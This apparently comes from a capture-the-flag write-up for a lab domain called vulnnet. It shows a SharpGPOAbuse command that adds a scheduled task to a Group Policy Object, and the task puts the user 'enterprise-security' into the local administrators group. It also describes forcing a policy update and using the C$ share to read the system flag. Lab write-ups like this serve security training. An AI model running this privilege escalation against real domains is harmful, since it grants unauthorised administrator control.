# GPO
**SharpGPOAbuse**
-----------------

```text-plain
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```

this will add our current user `enterprise-security` to the administrators group, we simply need to do an `gpupdate /force`

after this, we can perform any administrator actions, but we used this to acces the `C$` directory in samba, to read the system flag